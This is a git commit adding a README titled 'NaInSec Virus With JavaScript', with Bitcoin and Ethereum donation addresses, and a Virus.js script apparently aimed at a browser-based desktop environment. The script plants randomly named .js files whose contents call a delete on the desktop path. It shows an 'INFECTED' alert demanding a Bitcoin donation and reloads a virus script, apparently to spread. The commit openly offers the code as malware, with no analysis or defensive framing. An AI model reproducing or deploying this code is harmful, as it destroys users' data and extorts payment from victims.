27805e5968edef4e074f91a29388a19799bad666
NATIONAL INDONESIA SECURITY <160300963+NaInSec@users.noreply.github.com>
2024-02-24 12:20:15 +0700

    NaInSec_JSVirus

---
+++ README.md
@@ -0,0 +1,6 @@
+# NaInSec Virus With JavaScript.
+### Donate :
+```
+BTC - 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5
+ETH - 0xd7e669f6f861e7ac8c4ebbc7852b226af98517e4
+```
---
+++ Virus.js
@@ -0,0 +1,19 @@
+(function theLoop (i) {
+  setTimeout(function () {
+
+function randomNumber(min, max) {  
+    min = Math.ceil(min); 
+    max = Math.floor(max); 
+    return Math.floor(Math.random() * (max - min + 0.01)) + min; 
+}   
+
+$store.set('desktop/nainsec' + ( randomNumber(1, 1000000) ) + '.js', '$store.del("/a/desktop/)')
+$store.keys() 
+		if (--i) {         
+      theLoop(i);      
+    }
+  }, 100);
+})(1);
+
+$alert('WARNING YOU HAVE BEEN INFECTED BY XSVSCYB3R. Please Donate BTC : 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5')
+$loader.script("NaInSec_Virus.js")
